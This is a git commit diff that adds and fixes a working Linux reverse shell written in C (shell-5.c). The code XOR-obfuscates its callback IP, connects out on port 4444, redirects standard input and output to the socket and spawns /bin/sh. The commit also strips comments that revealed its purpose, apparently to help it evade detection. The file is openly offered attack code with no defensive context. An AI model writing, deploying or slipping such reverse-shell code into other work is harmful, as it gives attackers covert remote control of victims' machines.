1b990a4f5d6a32b90e172e74325807cd0b48aa09
MatrixTM26 <anonymous.matrixtm26.dev@gmail.com>
2026-07-19 02:21:38 +0700

    Add C (xor) reverse shell script for linux

--- C-shell/shell-5.c
+++ C-shell/shell-5.c
@@ -5,7 +5,6 @@
 #include <arpa/inet.h>
 #include <sys/socket.h>
 
-// Example decoder function
 void xor_decode(char *data, size_t data_len, char key) {
     for (size_t i = 0; i < data_len; i++) {
         data[i] = data[i] ^ key;
@@ -16,14 +15,11 @@ int main() {
     int sock;
     struct sockaddr_in server;
     
-    // Encoded IP string: "127.0.0.1" XORed with 0xAA
-    // (Actual encoded bytes depend on the exact plaintext, decode key is 0xAA)
-    char ip_encoded[] = { 0x6b, 0x48, 0x4b, 0x48, 0x01, 0x48, 0x48, 0x01, 0x48 }; 
-    char ip_decoded[16];
+    // "127.0.0.1" XORed with 0xAA. The final 0xAA acts as the null terminator \0 when decoded.
+    char ip_encoded[] = { 0x9B, 0x98, 0x9D, 0x84, 0x9A, 0x84, 0x9A, 0x84, 0x9B, 0xAA }; 
     
-    // Setup and decode IP
-    strcpy(ip_decoded, ip_encoded);
-    xor_decode(ip_decoded, strlen(ip_decoded), 0xAA);
+    // Decode in place. We pass sizeof(ip_encoded) to decode the entire block including terminator
+    xor_decode(ip_encoded, sizeof(ip_encoded), 0xAA);
     
     // Create socket
     sock = socket(AF_INET, SOCK_STREAM, 0);
@@ -32,21 +28,21 @@ int main() {
     }
 
     server.sin_family = AF_INET;
-    server.sin_port = htons(4444); // Listener port
-    server.sin_addr.s_addr = inet_addr(ip_decoded);
+    server.sin_port = htons(4444); 
+    server.sin_addr.s_addr = inet_addr(ip_encoded);
 
-    // Connect to attacker
+    // Attempt connection
     if (connect(sock, (struct sockaddr *)&server, sizeof(server)) < 0) {
         close(sock);
         return 1;
     }
 
-    // Redirect stdin (0), stdout (1), stderr (2) to socket
+    // Duplicate file descriptors
     dup2(sock, 0);
     dup2(sock, 1);
     dup2(sock, 2);
 
-    // Spawn shell
+    // Execute shell
     char *args[] = {"/bin/sh", NULL};
     execve("/bin/sh", args, NULL);
 
